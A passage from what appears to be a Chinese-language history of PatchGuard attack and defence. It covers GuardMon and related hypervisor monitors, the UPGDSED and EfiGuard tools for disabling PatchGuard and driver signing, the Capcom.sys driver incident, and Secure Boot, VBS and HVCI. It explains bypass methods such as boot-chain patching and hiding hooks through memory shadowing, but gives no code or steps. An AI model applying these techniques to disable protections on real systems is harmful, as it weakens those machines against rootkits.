第二句，它能记录（log）来自"不被任何映像文件背书的内核内存"（kernel memory not backed by any images）对 CR0、CR4、调试寄存器、GDT、IDT 与 MSR 的读与写活动。这里每个词都需要拆开讲。**CR0、CR4** 是 x86 的控制寄存器，决定分页、写保护等 CPU 核心行为，其中 CR0 的 WP（Write Protect，写保护）位决定内核代码能否改写只读页，REcon 幻灯片举的正是"检测可疑指令执行，例如修改 CR0.WP"这一例；**调试寄存器**（debug registers）决定硬件断点设在哪里，是攻防双方都盯着的资源；**GDT（Global Descriptor Table，全局描述符表）与 IDT（Interrupt Descriptor Table，中断描述符表）** 是决定段与中断处理入口的两张系统表，本身就是 PatchGuard 的重点保护对象；**MSR（Model-Specific Register，型号专用寄存器）** 是 CPU 提供的一组专用寄存器，系统调用入口等关键路径就配置在其中。这六类对象合起来，恰好是"有人在动内核的根基"时最先会碰的东西——也正是 PatchGuard 自己巡查、校验时必须反复读取的东西。

第三句点破了过滤条件的妙处："这一工具对分析 Windows 内建的内核补丁保护（即 PatchGuard）特别有用，因为它大多数时间运行在非映像区。" 所谓**非映像区（non-image region）**，指不属于任何已加载映像文件（如 ntoskrnl.exe、某个 .sys 驱动）的内核内存——动态分配的池内存、自生成代码所在的内存都属此类。正常驱动与内核代码绝大多数住在映像区里，它们的寄存器访问是海量且无趣的背景噪声；PatchGuard 为了躲避定位与摘除，偏偏把自己的检查代码与上下文放在非映像区里活动。于是"只记录来源地址落在非映像区的寄存器访问"这一个过滤条件，就像给监控录像加了人脸框：留下的画面里，主角大概率就是 PatchGuard 本人。GuardMon 的日志输出到 DbgView，并保存为 `C:\Windows\GuardMon.log`；它支持 x64 的 Windows 7、8.1 与 10，运行前提与 HyperPlatform 相同——CPU 须支持 Intel VT-x 与 EPT。README 同时明确交代，GuardMon 主要为演示目的（primarily designed for a demo purpose）而写：它是一个概念的展品，不是产品。

这里必须按纪律标注一条**未钉死**：README 只写到"记录这六类对象、且来源限于非映像区"为止，它没有说 GuardMon 用 EPT 给受保护结构设写保护陷阱，没有枚举它具体关注哪几个 MSR，也没有说明它是否监视 PatchGuard 的定时器、上下文结构或检查例程本身的内存访问。本节不替它补这些：凡想当然地把"监视寄存器访问"扩写成"全面监视 PatchGuard 的一举一动"的说法，都超出了公开文档的支撑范围。GuardMon 能确证的本事，是在 PatchGuard 干活时必然要摸的那几类寄存器上装了计数器，并按来源把 PatchGuard 的那一份单独挑出来。

##### 3. 为什么有趣：与第三类感染互为镜像

GuardMon 本身的技术并不复杂——挑出六类寄存器、按来源过滤、记日志，甚至称得上克制。它在攻防史里占一节，靠的是站位带来的观念冲击。

回到本书前面讲过的 Rutkowska 分类。Joanna Rutkowska 在 2006 年前后给内核恶意代码分过类，其中最被反复引用的是**第三类感染（Type III infection）**：恶意代码不住在操作系统里面，而是把整个操作系统虚拟化——它自己坐进 hypervisor 那一层，让操作系统在不知情的情况下变成客户机，从此操作系统看到的一切内存、寄存器与事件，都可以被这一层过滤、伪造或隐藏。Blue Pill 是这一类的概念演示。第三类之所以可怕，是因为它打破了"同级对抗"的僵局：被监视者无论怎么自查，也查不到比自己低一层的观察者，正如 PatchGuard 查不到坐在它下面的东西。

GuardMon 正是这面镜子的另一面（这是本节的读法，不是 Tanda 的原话）：同一项技术、同一种站位，攻方用它藏身，守方——或者说研究方——用它观察。PatchGuard 的全部设计哲学是"没有固定据点、检查者与被检查者互相校验"，它预设的对手是与它同处内核层的修改者；GuardMon 不进内核层与它缠斗，而是下沉一层，把 PatchGuard 每一次摸控制寄存器、描述符表与 MSR 的动作都记成日志。PatchGuard 引以为傲的"我的代码藏在非映像区里、位置随机"，到了 GuardMon 这里反而成了识别特征——藏得越深，在过滤后的日志里就越显眼。一个哨兵靠四处游走、无处不在来震慑全楼；GuardMon 做的，是在大楼地基里装一台只认哨兵脚步声的记录仪。这也是 Tanda 本人工作的一体两面：他把 PatchGuard 逐版本拆解的分析连载，与他站在更低层监视 PatchGuard 的工具，出自同一个人、同一套"要看清一层，就站到它下面去"的方法论。

还要给这面镜子加一道时代注脚：GuardMon 的站位后来被微软自己收编成了官方防御——VBS/HVCI 正是用 hypervisor 那一层来保护内核完整性，等于平台方亲自坐进了第三类感染曾经的位置。座位只有一个，这正是 HyperPlatform README 那条 Credential Guard 注记的深意：当微软的 hypervisor 先坐下，Tanda 式的第三方 hypervisor 就报"feature is not available"。研究者发明的观察位，最终变成了平台的防御位，而研究者本人反而被挤了出去——这是后话，本书的 HVCI 一节还会回到这里。

##### 4. 同门三兄弟：MemoryMon、EopMon、DdiMon 的分工

REcon 演讲里，GuardMon 不是单独出场的，它与同门工具一起，展示了"VM-exit 过滤平台"这一种底座能长出多少种工具。一句一个，区别如下：

**MemoryMon** 是"内存执行监视器"：它利用 EPT 盯住非映像区内核内存的**执行**——哪段不属于任何映像文件的内核内存被当作代码跑起来，就记录下来。它面向的是 rootkit 分析：手工注入、动态解包出来的内核代码无处遁形。REcon 的演示环节里，MemoryMon 对阵的是 Turla（Uroburos）一系的样本，用来从内存里取出解包后的代码。与 GuardMon 的区别在事件类型：GuardMon 盯寄存器访问，MemoryMon 盯内存执行，一个看"谁在摸开关"，一个看"哪块野内存里有人在跑"。

**EopMon** 是"提权成功探测器"：EoP（Elevation of Privilege，权限提升）攻击的经典收官动作是偷令牌（token stealing，把系统令牌换到自己进程上）。EopMon 利用 hypervisor 能监视进程上下文切换的便利，在切换点上检查令牌状态，发现偷令牌的进程就将其终止。REcon 的第二个演示用它对阵 Gozi（Ursnif）样本。与前两者的区别在姿态：MemoryMon 与 GuardMon 只观察、记日志，EopMon 会出手干预——同台演讲里 Tanda 特意把这条分界讲成"hypervisor-based protection"（基于 hypervisor 的防护）一节。

**DdiMon** 是"内核 API 监视器"，也是与 PatchGuard 缠斗得最直接的一个。DDI（Device Driver Interface，设备驱动接口）指 ntoskrnl 导出给驱动调用的那组内核函数。DdiMon 用 EPT 做**内存影子（memory shadowing）**：让客户机"执行时看到的函数开头"与"读取时看到的函数开头"是两份不同的内容——执行时撞上它设下的钩子，读取时看到的却是原封不动的干净字节。普通内联钩子（inline hook，改写函数开头字节的钩子）之所以会被 PatchGuard 抓到，就是因为校验时读到的字节变了；DdiMon 让校验永远读到干净的那一面，于是钩子对 PatchGuard 隐形。它的 README 明说，示范用的钩子装在 ExAllocatePoolWithTag、ExQueueWorkItem 等少数几个 DDI 上，目的正是监视 PatchGuard 的活动、顺带隐藏进程而不被 PatchGuard 发现。与 GuardMon 的区别在层与法：GuardMon 是被动地在寄存器层面看 PatchGuard 摸了什么，DdiMon 是主动地在函数调用层面截 PatchGuard 走了哪条路，而且要一边截、一边骗过 PatchGuard 的眼睛。

四个工具排在一起，HyperPlatform 的产品形态就清楚了：底座只负责把硬件事件端上来，工具各自选一道菜。GuardMon 在其中的位置是最小、最纯粹的那个——不钩、不藏、不杀，只记。这份克制恰是它作为研究工具的价值：它产出的不是绕过，而是一份 PatchGuard 行为的原始账本，后来者分析 PatchGuard 的触发与巡查节奏时，这类账本就是第一手材料。

#### 二、UPGDSED：把"懒人法"做成一键工具

##### 1. 源头：Fyyre 的两份 TXT 与一条手工路线

UPGDSED 的全称是 Universal PatchGuard and Driver Signature Enforcement Disable——通用 PatchGuard 与驱动签名强制禁用器。**DSE（Driver Signature Enforcement，驱动签名强制）** 指 x64 Windows 要求内核驱动必须带有合格数字签名才准加载的那道门禁，它与 PatchGuard 是一对搭档：DSE 管"进门时验票"，PatchGuard 管"进门后巡查"。想在自己机器上跑未签名驱动、或者安安静静地改内核的人，两道门都得处理，这正是这类工具总是把两个目标打包在一起的原因。

这个工具的思想源头不在 GitHub，而在两份纯文本文件。UPGDSED 仓库的 References 一节列得很清楚，它站在前人的肩膀上：Skywing 的 Uninformed 首破论文在最前面，其后就是 Fyyre 的两份文档——《Disable PatchGuard – the easy/lazy way》（禁用 PatchGuard：简单/懒人法，文件 bootloader.txt）与它的更新版《Disable PatchGuard – updated for Win7 & Win8》（文件 bootloader_v2.txt），此外还列了 Fyyre 的一个 MBR bootkit 作品（bootkit_fasm）。**bootkit** 指在操作系统启动最早阶段就夺取控制权的恶意或研究用代码；**BCD（Boot Configuration Data，启动配置数据）** 是 Windows 自 Vista 起存放启动菜单与启动项配置的数据库，后文马上要用。

"懒人法"这个名字本身就是一份方法论宣言。第一份 TXT 为 Vista SP2 与 Windows 7 x64 而写（其流传文本标注的最后更新为 2011 年 3 月），开篇自述的目标是：不用任何驱动，纯靠在启动阶段做文章，绕过关键系统文件的签名校验，让 PatchGuard 根本不初始化。它的基本盘算是一条链（此处只述原理类别，不述操作细节）：内核文件在磁盘上被改动后，启动加载器会因签名校验不过而拒绝启动；所以要改的不止内核一处，而是沿着"谁校验谁"的启动信任链逐级处理，再为改好的文件副本新建一个 BCD 启动项，开机时选这个启动项，就等于让系统从一条被整体"放行"的链上启动，PatchGuard 在这条链的终点不会被初始化，签名强制也随之失效。第二份 TXT 把这套办法更新到了 Windows 7 与 Windows 8。FASM 汇编论坛上同期流传的同类脚本（把原版加载器与内核复制一份、打上少量补丁、新建启动项）也自称源于 Fyyre 的工作，可见这套"复制—打补丁—新启动项"的路子在当时的小圈子里已经是公共知识，缺的只是一个把全部步骤包起来、不用再对着十六进制编辑器手工操作的产品。

这条路线有一个与生俱来的性质，决定了它后面全部的命运：它改的是**磁盘上的文件**。好处是简单、直接、不依赖任何运行时漏洞；坏处是每一处补丁都钉在具体版本的字节形态上——微软每月补丁动一动内核，这套按图索骥的定位就可能失效，需要有人重新适配。用一个词概括，就是"版本敏感"。请记住这四个字，它是本节后半段的伏笔。

##### 2. 2017 年：手艺变工具

2017 年 6 月 1 日，Fyyre 在 Exetools 论坛（一个以逆向工程工具交流著称的老牌论坛）发帖，帖子开头一句就是产品说明："Tool created by myself (Fyyre) and long time friend EP_X0FF. It disable driver signing enforcement and Patch Guard on Windows 7, 8 & 10."（这个工具由我 Fyyre 与老朋友 EP_X0FF 共同制作，它禁用 Windows 7、8 与 10 上的驱动签名强制与 Patch Guard。）仓库开在 EP_X0FF 的 GitHub 账号 hfiref0x 名下，项目署名 (c) 2017–2018 UPGDSED Project，作者栏就是两人。EP_X0FF 在 Windows 内核安全圈以维护多个开源研究工具著称，UPGDSED 是他名下最出圈的一个。

UPGDSED 把"懒人法"的手工步骤收进了一个以管理员权限运行的 patch.exe：它在磁盘上处理启动链的各级组件（自启动管理器、启动加载器到内核本体），生成打好补丁的副本，并新建一个 BCD 启动项，用户重启后选择该启动项，即进入 PatchGuard 与 DSE 双双失效的系统；想卸载，删掉那个启动项与副本文件即可恢复原状——卸载说明的存在本身，恰好反证了它"原文件不动、另起一份副本、菜单里二选一"的设计。工具附完整源码，README 写明可用 Visual Studio 2015 及更高版本自行构建。按 README 的 System Requirements，它的适用范围是 x64 的 Windows 7 SP1、Windows 8、Windows 8.1 与 Windows 10（列到 TH1 至 RS3，即 2017 年秋季的版本为止）；使用前提有二：管理员权限，以及——若是 EFI 启动——必须关闭 Secure Boot。**Secure Boot（安全启动）** 是 UEFI 固件在启动时逐级验签启动组件的机制，磁盘上的启动文件一旦被改动、签名失效，开着 Secure Boot 的机器会在固件层就拒绝它；这一点 Fyyre 在 Exetools 帖子里的回复同样干脆，有人问开着 Secure Boot 能否使用，他的答复是："Secureboot? Sorry, no."（Secure Boot？抱歉，不行。）

README 的警告部分值得原文照录，因为它定义了这类工具与使用者之间的契约：

> WARNING: Using this program might render your computer into an unbootable state.
> （警告：使用本程序可能使你的电脑进入无法启动的状态。）
>
> Source code provided AS-IS in help it will be useful BUT WITHOUT WARRANTY OF ANY KIND. ANY USE OF THE SOFTWARE IS ENTIRELY AT YOUR OWN RISK.
> （源码按"现状"提供，希望有用，但不附带任何种类的担保。使用本软件的一切风险由你本人承担。）

在 Exetools 的原帖讨论里，用户实际运行时的第一道交互也是同一句话的复现——程序先警告可能变砖，要求使用者亲手输入确认才继续。这种"丑话说在前面、源码全公开、风险自理"的风格，是那个年代内核工具圈的标准伦理：作者不为你的机器负责，但把一切摊开给你看。在攻防史的叙事里，UPGDSED 的意义不在技术新颖——它的每一步都有出处，References 列得明明白白——而在门槛的坍塌：Skywing 2005 年写论文时，全世界能绕过 PatchGuard 的人以个位数计；2017 年起，会双击、会重启、会选启动项的人都可以。前文说过，防守方自此面对的不再是少数研究者，而是任何会用工具的人，UPGDSED 就是这句话最具体的注脚。

##### 3. 2018 年弃坑：指路牌比工具活得久

UPGDSED 的寿命很短。README 的 Deprecation（弃坑）一节写道：

> The project has been deprecated in 2018. No further updates (or plans on them) are available. If you still need PatchGuard disable refer to these repositories (alphabetical order): EfiGuard, Shark. This repository is kept read-only for historical purposes.
> （本项目已于 2018 年弃坑。不会再有后续更新，也没有此种计划。如果你仍需要禁用 PatchGuard，请参考以下仓库（按字母顺序）：EfiGuard、Shark。本仓库转为只读，仅为历史目的保留。）

注意弃坑的方式：不是删库跑路，而是把仓库冻成档案，再立一块指路牌，把后来者送去两个继任者那里。本节只确证 README 列了这两个名字（Shark 的具体机制未在本节核查范围内展开，列入未钉死，不替它编写履历）；其中 EfiGuard 与 UPGDSED 的承继关系，有继任者自己的 README 作证，讲得出完整的来龙去脉。

EfiGuard 作者 Mattiwatti 在其 README 的 Architecture（架构）一节里自述：EfiGuard 最初并不是 UEFI 工具，而是一个运行在 NT 之上、与 UPGDSED 类似的磁盘打补丁程序（"originally an on-disk patcher running on NT (similar to UPGDSED)"），最初的目的是验证一条不同的技术路线——用反汇编器在运行时解码指令来定位待改之处，而不是像 UPGDSED 一代那样依赖 PDB 符号与为每个版本定制的特征签名；其内核打补丁源码文件至今仍保留着最初设计的样子。这条路线被证明经得起折腾——一年多的 Windows 更新里无需改代码——之后作者才把战场搬进 UEFI：让一个 UEFI 阶段的驱动在启动过程中逐级守候，在内存里对启动管理器、启动加载器与内核下手。搬家带来的好处，README 列得像一份对 UPGDSED 的逐条回应：不再需要对磁盘上的内核与加载器做任何修改；不再需要用 bcdedit 改启动配置；甚至——只要你握有平台密钥、能把自己的证书加进固件的签名数据库——可以反过来**启用** Secure Boot。至此，那句"Secureboot? Sorry, no."被继任者改写成了"可以，但钥匙得是你的"。EfiGuard 的支持范围也一举拉满：自述支持从 Vista SP1 到 Windows 11 的全部 EFI 兼容 x64 Windows 版本。

但 EfiGuard 的 README 同样留了一条边界，而且这条边界正是整个磁盘打补丁时代落幕的判词：它无法禁用 HVCI，原因是 HVCI 运行在更高的特权层；它可以与 HVCI 共存、也确实能在普通内核里禁掉 PatchGuard，但"那在实践中没有用，因为 HVCI 会接手 PatchGuard 从前干的活"，两种 DSE 绕过在 HVCI 面前同样失效——完整性检查的裁决权已经被安全内核接管。换成攻防史的话说：启动期路线辛辛苦苦把哨兵放倒，却发现大楼已经换了保安公司，新保安站在 hypervisor 那一层——恰恰是 GuardMon 当年待过、后来被微软收编的那一层。

##### 4. 时代背景：为什么这类工具注定短命

把 UPGDSED 的一生放在时间轴上，它的短命不是作者懒，而是三股力量同时挤压（本段为综合分析，非单一来源原话）：

其一，**版本敏感的先天病**。按特征与符号定位补丁点的办法，天生追着 Windows 更新跑。EfiGuard 作者复盘前辈时，把 UPGDSED 与另一款 UEFI bootkit 并列为因"版本敏感的模式扫描"而在新版本上失效的例子；UPGDSED 自己的支持清单停在 Windows 10 RS3（2017 年秋季），此后每个新版本都是一次新的适配债，作者在 2018 年选择不再偿还。

其二，**Secure Boot 的普及封死了分发面**。磁盘打补丁路线的前提是固件不验签或验签可关：Vista/Win7 年代的 BIOS 机器天然满足，UEFI 年代就只剩"请用户先关掉 Secure Boot"这一条路（README 的系统要求与 Fyyre 的论坛回复都是明证）。随着 Secure Boot 成为新机器的出厂默认，这类工具的适用人群从"所有人"缩小到"愿意且能够改固件设置的人"，而 OEM 锁定、双系统冲突之类的现实摩擦还在继续收窄它。EfiGuard 换到 UEFI 阶段、甚至争取与 Secure Boot 共存，正是对这股压力的直接回应。

其三，**防线整体下沉**。VBS/HVCI 把完整性保护搬进 hypervisor 层之后，启动期把普通内核改成什么样都不再重要——裁决在另一个世界里做。这与 GuardMon 一节的结尾正好合拢：2016 年研究者还能自备 hypervisor 坐到系统下面去观察 PatchGuard，数年之后，那个座位成了微软防御体系的地基，第三方 hypervisor 与启动期补丁一起被挤到了墙角。一个时代的工具在 2018 年前后集体退场，不是巧合，是地基换了主人。

最后留一条未钉死：UPGDSED 仓库现行 README 的弃坑声明写于何时、指路名单的增补顺序如何，公开页面只给出"2018 年弃坑、现为只读"的现状，本节不替它编年到月。Fyyre 第一份 TXT 的确切首发日期，同样只确证到其流传文本自注的 2011 年 3 月最后更新，不再上溯。

##### 来源清单

- GuardMon 仓库与 README（监视对象、非映像区过滤、日志与支持平台、演示定位）：https://github.com/tandasat/GuardMon
- HyperPlatform 仓库与 README（框架定位、可监视事件、四件示范工具、Credential Guard 注记）：https://github.com/tandasat/HyperPlatform
- REcon 2016 演讲页（演讲摘要、MemoryMon/EopMon 演示说明）：https://recon.cx/2016/talks/Monitoring-and-controlling-kernel-mode-events-by-HyperPlatform.html
- REcon 2016 演讲幻灯片（7KLOC、约 10% 开销、VM-exit 过滤平台、GuardMon 与 CR0.WP 示例、局限）：https://recon.cx/2016/resources/slides/RECON-0xA-HyperPlatform-Satoshi.pdf
- DdiMon README（EPT 内存影子钩子、示范 DDI 清单、与 PatchGuard 的关系，经镜像页核读）：https://raw.githubusercontent.com/CrazyMrCode/DdiMon/master/README.md
- UPGDSED 仓库 README（系统要求、变砖警告原文、弃坑声明与指路、References 与作者，经镜像页核读）：https://github.heygears.com/hfiref0x/UPGDSED
- Exetools 2017 年发布帖（Fyyre 原帖、Secure Boot 答复、运行警告实录）：https://forum.exetools.com/showthread.php?t=18273
- EfiGuard 仓库 README（与 UPGDSED 的承继自述、反汇编路线、UEFI 化收益、HVCI 边界）：https://github.com/Mattiwatti/EfiGuard
- Fyyre 第一份 TXT 的流传镜像（"easy/lazy way" 自述目标与 2011 年 3 月最后更新标注，经镜像页核读，仅作脉络旁证）：https://topic.alibabacloud.com/a/windows-x64-patch-guard_1_15_30881561.html

*一个把 hypervisor 做成望远镜，一个把启动链做成撬棍——GuardMon 与 UPGDSED 留下的，是 PatchGuard 攻防从个人手艺变成公共工具、又被时代逐一收走座位的那一页档案。*

**2016 年，Capcom 事件**：9 月，《街头霸王 V》的更新给玩家装上了一个名为 Capcom.sys 的签名驱动——它注册了一个不设任何访问校验的设备，其 IOCTL 处理能关掉 SMEP（Supervisor Mode Execution Prevention，禁止内核执行用户页代码的 CPU 机制）、把调用者传进来的代码以 ring 0 权限执行。本意是反作弊，结果是任何低权限进程都能借它当任意内核代码执行的跳板。事件曝光后 Capcom 在约两天内回滚了更新。这是 BYOVD 问题最辛辣的注脚：**不需要偷钥匙、不需要找漏洞——厂商自己把万能钥匙发到了每台玩家电脑上，还签了名。** 它也解释了为什么后来的微软黑名单里，"行为本身即危险"的签名驱动与"有漏洞"的驱动被一并收录。

## 第五幕（2015–2018）：防线下沉一层

**微软的平台级回应一：VBS / HVCI**。Windows 10 引入基于虚拟化的安全（VBS）：hypervisor 把系统切成普通世界（VTL0，常规内核的地盘）与安全世界（VTL1，安全内核的地盘），代码完整性检查搬进 VTL1 执行，内核代码页的可写性由 hypervisor 用二级页表说了算——**VTL0 里的代码，哪怕是内核代码本身，也改不动被标记为只读执行的代码页**。这正是 mechanisms 篇里那句"把 PatchGuard 的职责用硬隔离重做"的落地：PatchGuard 在 ring 0 内巡逻，而 HVCI 站在 ring -1 把"改代码"这个动作本身从物理上禁掉。PatchGuard 没有退役（数据结构看护仍归它），但它从防线本体降格为纵深的一层。

### 详解：Secure Boot、VBS、VTL0/VTL1 与 HVCI——PatchGuard 之后的平台级防线

攻防史正文里反复出现一句话：微软后来的回应是"把防线下沉"。这一节把下沉到的那几层逐个拆开讲清。先给一张总图，后面逐层展开。整套架构的信任顺序是自下而上的：

- **硬件与固件层**：UEFI 固件 + Secure Boot，负责"开机时谁有资格把第一段代码交出去"；
- **hypervisor 层**：Windows hypervisor（Hyper-V 的 hypervisor）在操作系统之前接管 CPU 的虚拟化控制权，成为全机最高的执行层；
- **VTL1（安全世界）**：安全内核（secure kernel）住在这里，替整个系统保管"裁决权"——代码能不能执行、哪些数据不许改，由它说了算；
- **VTL0（普通世界）**：我们熟悉的 Windows 本体——NT 内核、驱动、用户进程——全部住在这里，继续干活，但头上多了一层它改不动的规矩；
- **建在框架上的具体功能**：HVCI（管代码页）、KDP（管被申报保护的数据）、Credential Guard（管凭据秘密）等，都是 VBS 这套框架长出来的应用，不是框架本身。

PatchGuard 在这张图里的位置没有变——它仍在 VTL0 的 ring 0 里巡逻。变的是它周围：上面多了三层它够不着、攻击者也够不着的东西。下面逐个讲。

### Secure Boot：把信任链推到开机之前

**定义**：Secure Boot 是 UEFI 固件的一项功能（UEFI 规范的一部分）：固件在加载每一段启动期代码——固件驱动（Option ROM）、EFI 应用、操作系统引导程序——之前，先验它的数字签名，签名不在信任名单内就不许执行。它的用途是堵住"赶在操作系统醒来之前动手"这条路：bootkit、启动期 rootkit 的共同点就是抢在内核与杀毒软件之前运行，操作系统层面的任何防御对它们都太晚了。为什么要有它：PatchGuard 的教训之一就是，运行时同级对抗没有终局——既然如此，就把第一道裁决提前到开机、并交给位于操作系统之下的固件来做。

**四本账：PK、KEK、db、dbx，谁签谁**。Secure Boot 的信任不是一句"微软签的就行"，而是一套四级 PKI 层级，四本账都存在主板的 NVRAM 里：

- **PK（Platform Key，平台密钥）**：整套层级的根，**只有一把**，由平台所有者（出厂时是 OEM）持有私钥。PK 不直接验任何启动代码，它只做一件事：授权谁能修改下面第二级 KEK 名单。另外，PK 在不在还决定固件的工作模式：PK 未登记时固件处于 **Setup Mode**，四本账可以无授权改动；登记 PK 后进入 **User Mode**，改账必须有签名授权。所以"登记 PK"这个动作本身就是"把这台机器的启动信任交给谁"的宣告。
- **KEK（Key Exchange Key，密钥交换密钥）数据库**：第二级名单，装的是"有权修改 db/dbx 的签名者"的证书。KEK 名单的增删必须由 PK 私钥签名授权。PC 上预置的主要是微软的 KEK CA（Microsoft Corporation KEK CA）——这意味着微软（以及经 PK 授权的其他 OS 厂商）能往 db/dbx 里写东西，但改不了 KEK 名单本身。
- **db（允许签名数据库）**：真正干验签活的名单，装可信签名者的证书或具体镜像的哈希。固件加载一段启动代码时，拿它的签名去 db 里比对：签发者在 db 里、签名有效，才放行。Windows 能启动，靠的就是微软的 Windows 生产 CA 在 db 里。
- **dbx（禁止签名数据库）**：吊销名单，装已被判定恶意、有漏洞或被攻破的密钥、证书与镜像哈希。一条关键规则：**同一个哈希若同时出现在 db 与 dbx 里，dbx 优先**——吊销压过允许。dbx 是这套体系的"事后补救口"：某个被合法签名的引导组件后来被发现是洞（正文里讲过的漏洞驱动黑名单是同一思路在驱动层的版本），不用换根密钥，往 dbx 里添一条就能全网点杀。

四者的签名链一句话说清：**PK 签 KEK 的变更，KEK 名单里的人签 db/dbx 的变更，db/dbx 决定每一段启动代码的生死**。每一级的私钥只管下一级的名单，没有任何一级能越级自封。

**启动链如何逐级验签**。开机后执行权的转移方式是"上一段代码验完签名、再把控制权交给下一段"，逐环相扣：

1. CPU 上电先跑固件自身的早期代码（固件的根信任部分不在本节展开），UEFI 固件初始化硬件后，按 db/dbx 逐个验它要加载的固件驱动与 Option ROM；
2. 固件验 **Windows 启动管理器 bootmgfw.efi**（位于 EFI 系统分区 `\EFI\Microsoft\Boot\`）的签名：签发者须在 db 里、且不得命中 dbx，验不过就不交控制权——先试备份副本、再走 OEM 指定的修复流程，都不行就停机；
3. bootmgfw 运行后读启动配置（BCD），验下一段 **Windows 引导程序 winload.efi** 的签名再移交——从这一环起，链条进入微软文档所称的 Trusted Boot 范围：每一环验下一环；
4. winload 验 **NT 内核 ntoskrnl** 及启动期驱动的签名并装载它们；若启用了 VBS，hypervisor 与安全内核的镜像也在内核正式接管机器之前由这条链装载到位（细节见下一节）；随后 winload 把控制权交给内核入口，内核初始化后尽早加载 ELAM（Early Launch Anti-Malware，早期启动反恶意软件）驱动，启动期验签的接力棒才算交完。

**关掉 Secure Boot 意味着什么**。x86 PC 允许用户在固件设置里关闭它（Windows 认证要求之一就是用户可关），关闭后固件不再验任何签名：任意未签名的引导程序、DXE 驱动、被改过的 bootmgfw 都能直接运行——信任链的第一环整个撤掉，后面各环验得再严也失去意义，因为执行权在验签开始之前就已经给出去了。**这正是 EfiGuard 必须先关 Secure Boot 的原因**，而且是双重的：其一，EfiGuard 本体是一个未签名的 UEFI DXE 驱动，Secure Boot 开着时固件根本不会加载它，它连出场机会都没有；其二，就算它能出场，它的工作方式是给 bootmgfw、winload、ntoskrnl 逐个打补丁，而被打过补丁的镜像过不了下一环的验签——补丁还没生效，链条先断了。反过来说，Secure Boot 开着的机器上，攻击者想走启动期路线，先得找一个**签名合法但有洞**的启动组件当跳板，门槛与"随便放个文件进去"是两个量级。

**没有它会怎样、它挡不住什么**。没有 Secure Boot 的世界就是 2012 年之前的世界：MBR bootkit 在野泛滥，先于一切防御常驻。它挡不住的也同样明确：它只管"启动期加载的代码"，系统跑起来之后的事一概不管（那是签名强制、PatchGuard、HVCI 的地盘）；它信任的是"签名"而不是"行为"——签名合法但有漏洞的组件在被塞进 dbx 之前畅通无阻；固件实现本身若有洞，根就烂了，这也是后来又出现 System Guard Secure Launch（用 DRTM 动态根信任在启动后期再量一遍）这类补强的原因，本节不展开。

### VBS 与 hypervisor：先把舞台说清

**hypervisor 是什么**。hypervisor（虚拟机监控器）是运行在操作系统之下、直接接管 CPU 硬件虚拟化能力的一层薄软件。它做什么用：把一台物理机切成若干个互不可见的执行环境（分区/虚拟机），并独占第二级地址翻译（SLAT）与 IOMMU 的配置权——也就是说，**每个环境眼里的"物理内存"长什么样、能碰哪几页，最终由它说了算**。Windows 用的 hypervisor 是 Hyper-V 的 hypervisor，属 Type 1（裸机型）：它先于任何操作系统启动，此后连"宿主"Windows 本身也只是跑在它之上的一个特殊分区（根分区）里当客人。启用 VBS 时，winload 在 NT 内核接管之前先把 hypervisor 装载起来，hypervisor 接管 CPU 后再把控制权交还给启动链继续跑内核——内核从醒来的第一秒起就已经是"客人"了，只是它自己无从察觉。

**"ring -1"的说法准不准**。民间常把 hypervisor 所在的层叫 ring -1。**作为直觉比喻是对的，作为架构术语不准确**。ring（CPL，当前特权级）是 CPU 在**来宾执行上下文内部**划分的 0–3 级，管的是来宾代码之间的权限；hypervisor 不在这个序列里——它跑在另一个执行模式里（x64 上是 VMX root 模式，ARM64 上是 EL2），与来宾的 VMX non-root 模式（或 EL1/EL0）是"里外"关系，不是"上下"关系。区别不是抠字眼：ring 0 的代码改一下 CR3 就能换个地址空间，而来宾想碰 hypervisor 的内存，连寻址都寻不到——SLAT 里根本没有给它映射。说 ring -1 会让人误以为它只是"更高一级的 ring 0"，低估了这道边界的性质：PatchGuard 与内核的对抗是同级对抗，VTL0 与 hypervisor 的对抗是**跨模式**对抗，前者的全部技巧（关中断、改页表、抢时间窗）在后者面前多数直接失效。

**VBS 是什么**。VBS（Virtualization-Based Security，基于虚拟化的安全）**不是一个功能，而是一套总框架**：它利用上面的 hypervisor，在同一个 Windows 实例内部再切出一个高信任的小环境，并立下一条设计前提——**假设 VTL0 的内核已经被攻破，仍要保证放在高信任环境里的资产不丢**。微软文档的原话口径是：VBS 造出的隔离环境"成为操作系统的信任根，这个信任根以'内核可被攻破'为前提"。框架本身只提供隔离与裁决通道，具体功能都是在它之上长出来的：安全内核与 HVCI（下一节）、Credential Guard（把域凭据、Kerberos 密钥搬进 VTL1 的隔离进程，VTL0 内核被攻破也读不到）、KDP（再下一节）、VBS Enclaves（给用户态程序用的 VTL1 小隔间）等，各管一摊。启用 VBS 的硬件门槛也来自框架本身：UEFI + Secure Boot、x64 处理器带虚拟化扩展与 SLAT，IOMMU 与 TPM 2.0 为推荐项。Windows 11 在满足前提的设备上默认开启 VBS 与 HVCI。

### VTL0 与 VTL1：同一台机器里的两个世界

**VTL 是什么**。VTL（Virtual Trust Level，虚拟信任级别）是 hypervisor 的 VSM（Virtual Secure Mode）设施给"同一个分区内部"定义的信任层级：数字越大越可信，高层能给低层设内存保护、低层无从修改。为什么要有它：传统的 ring 模型里，ring 0 就是天花板，内核一旦被攻破，上方再无立足点——攻防史前半本讲的全是这个困局。VTL 是在 ring 模型**之外**另起的一根轴：同一个虚拟处理器上叠两套完整的执行上下文，平时跑低层那套，高层那套只在需要裁决时被唤醒。Hyper-V 的架构上最多支持 16 级 VTL，**现行实现只用了两级**：VTL0 与 VTL1。（注意：VTL 与 VBS 的关系是"地基与楼"——VTL 是 hypervisor 提供的机制，VBS 是 Windows 在这套机制上盖出来的安全体系；微软文档里 VSM 是这套 hypervisor 设施在规范中的名字。）

**VTL0：普通世界**。VTL0 里装的是读者熟悉的一切：NT 内核（ring 0）、全部驱动、全部用户进程（ring 3），包括 PatchGuard。它的特权与传统 Windows 内核毫无区别——在自己的世界里它仍是至高无上的，页表随便改、物理内存随便映射。它不知道的是，自己眼中的"物理地址"只是客户物理地址（GPA），还要再过一道它管不着的翻译才落到真实物理页上（见下文 SLAT）。VTL0 被攻破在 VBS 的威胁模型里是**预设事件**，不是意外。

